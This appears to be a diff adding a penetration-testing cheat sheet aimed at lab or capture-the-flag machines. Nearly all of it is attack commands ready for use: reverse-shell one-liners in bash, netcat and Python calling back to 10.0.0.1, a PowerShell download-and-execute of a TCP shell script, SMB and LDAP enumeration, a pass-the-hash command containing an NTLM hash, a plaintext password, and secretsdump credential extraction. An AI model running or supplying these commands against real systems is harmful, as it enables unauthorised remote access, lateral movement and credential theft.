@@ -1,0 +1,75 @@
+#OneLiners
+bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+{nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
+root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
+
+#Upgrade to PTY
+python -c 'import pty; pty.spawn("/bin/bash")'
+or
+script -q /dev/null sh
+
+Ctrl+Z
+
+stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
+
+get ROWS and COLS
+
+stty raw -echo; fg
+
+reset x2
+
+stty rows ${ROWS} cols ${COLS}
+
+TERM=xterm
+xterm-color/xterm-256color
+
+
+#Useful Kali Directories
+ls /usr/share/webshells/webshells
+ls /usr/share/windows-binaries/privesc
+
+#File Uploading/Downloading
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-PowerShellTcp.ps1
+wget http://10.0.0.1/
+Requires cscript echo script - cscript wget.vbs http://10.0.0.1/file.exe FILEYOUNEED
+sudo smbserver.py -comment 'Transfer' smb smb
+sudo python -m SimpleHTTPServer 80
+
+#Priv Esc
+./LinEnum.sh -s -r report -e /tmp/ -t
+winPEAS.bat/exe
+LinPeas.sh
+
+#SMB 139/445
+smbmap -H 10.10.10.97 -u anonymous -R
+CME - Run as Root
+cme smb 10.10.10.97 -u '' -p '' --shares
+cme smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
+smbclient -N -L 10.10.10.97
+mount -t cifs '//10.10.10.97/directory' smb -v -o user=username,[pass='92g!mA8BGjOirkL%OG*&']
+umount smb
+
+#HTTP 80
+feroxbuster -u http://10.10.10.97/ -x php js txt -w /usr/share/seclists/Discovery/Web-Content/
+directory-list-2.3-medium.txt --extract-links
+use raft after.
+nikto -host http://10.10.10.97 -C all -o nikto-scan.htm
+
+#LDAP 389/636/3268/3269
+rpcclient -U '' -N 10.10.10.97
+enumdomusers
+enumdomgroups
+ldapsearch -h 10.10.10.97 -x -s base namingcontexts
+ldapsearch -h 10.10.10.97 -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && cat ldap.out |grep -i memberof
+
+
+#PTH Attack
+pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.97 cmd
+
+#Enumeration
+sudo rustscan --ulimit 5000 10.10.10.97 -- -A -sC -sV --script 'default,vuln' -oX scan | xsltproc scan -o scan.html
+
+#Dump
+secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
